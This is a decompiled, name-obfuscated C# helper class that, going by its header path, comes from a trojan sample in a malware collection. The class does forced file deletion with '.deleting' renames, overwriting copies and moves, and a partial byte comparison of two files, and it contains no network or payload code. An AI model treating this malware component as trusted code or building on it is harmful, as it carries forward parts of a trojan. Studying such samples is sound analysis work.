// Decompiled with JetBrains decompiler
// Type: 566234454343.787551421942
// Assembly: 422928051450, Version=1.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F1AD5918-0B7E-492E-9A94-09EF01F479FE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-22363a93cfc60354c16166d43ba99151a041696e2a77361bd34b49818dd210d2.exe

using \u003566234454343;
using \u003627586333967;
using System;
using System.Collections.Generic;
using System.IO;

namespace \u003566234454343
{
  public static class \u003787551421942
  {
    public static IEnumerable<string> \u003264867389258(string _param0)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u003741523902115.\u003381311331092 obj = new \u003741523902115.\u003381311331092(-2);
      // ISSUE: reference to a compiler-generated field
      ((\u003787551421942.\u003244774054170) obj).\u003346426605215 = _param0;
      return (IEnumerable<string>) obj;
    }

    public static IEnumerable<string> \u003601597079562(
      string[] _param0,
      SearchOption _param1 = SearchOption.TopDirectoryOnly)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u003787551421942.\u003244774054170 obj = new \u003787551421942.\u003244774054170(-2);
      // ISSUE: reference to a compiler-generated field
      ((\u003787551421942.\u003979664285283) obj).\u003622404277146 = _param0;
      // ISSUE: reference to a compiler-generated field
      ((\u003787551421942.\u003979664285283) obj).\u003990498661693 = _param1;
      return (IEnumerable<string>) obj;
    }

    public static bool \u003035257812365(string _param0)
    {
      if (Directory.Exists(_param0))
        return \u003741523902115.\u003456511910349(_param0) != 0;
      if (!File.Exists(_param0))
        return true;
      string str = _param0;
      bool flag1 = true;
      if (!str.EndsWith(".deleting", StringComparison.OrdinalIgnoreCase))
      {
        flag1 = false;
        int num = 0;
        while (true)
        {
          str = _param0 + "." + num.ToString() + ".deleting";
          if (File.Exists(str))
          {
            flag1 = true;
            ++num;
          }
          else
            break;
        }
        try
        {
          File.Move(_param0, str);
        }
        catch (Exception ex)
        {
          str = _param0;
        }
      }
      bool flag2 = false;
      try
      {
        flag2 = \u003787551421942.\u003853231770378(str);
        if (flag1)
        {
          string searchPattern = Path.GetFileName(_param0) + ".*.deleting";
          foreach (string file in Directory.GetFiles(Path.GetDirectoryName(_param0), searchPattern))
            \u003787551421942.\u003853231770378(file);
        }
      }
      catch
      {
      }
      return flag2;
    }

    public static bool \u003853231770378(string _param0)
    {
      bool flag = false;
      if (!File.Exists(_param0))
        return true;
      try
      {
        FileAttributes attributes = File.GetAttributes(_param0);
        if ((attributes & FileAttributes.ReadOnly) != (FileAttributes) 0)
        {
          FileAttributes fileAttributes = attributes & ~FileAttributes.ReadOnly;
          File.SetAttributes(_param0, fileAttributes);
        }
        File.Delete(_param0);
        flag = true;
      }
      catch (Exception ex)
      {
      }
      return flag;
    }

    public static void \u003834373287662(string _param0, string _param1)
    {
      \u003787551421942.\u003035257812365(_param1);
      File.Copy(_param0, _param1);
    }

    public static void \u003594008380947(string _param0, string _param1)
    {
      \u003787551421942.\u003035257812365(_param1);
      File.Move(_param0, _param1);
    }

    public static bool \u003923680293193(string _param0, string _param1)
    {
      byte[] buffer1 = new byte[8192];
      byte[] buffer2 = new byte[8192];
      using (FileStream fileStream1 = File.Open(_param0, FileMode.Open, FileAccess.Read))
      {
        using (FileStream fileStream2 = File.Open(_param1, FileMode.Open, FileAccess.Read))
        {
          int num1 = fileStream1.Read(buffer1, 0, buffer1.Length);
          int num2 = fileStream2.Read(buffer2, 0, buffer2.Length);
          if (num1 != num2)
            return false;
          for (int index = 0; index < num1; ++index)
          {
            if ((int) buffer1[index] != (int) buffer2[index])
              return false;
          }
        }
      }
      return true;
    }
  }
}
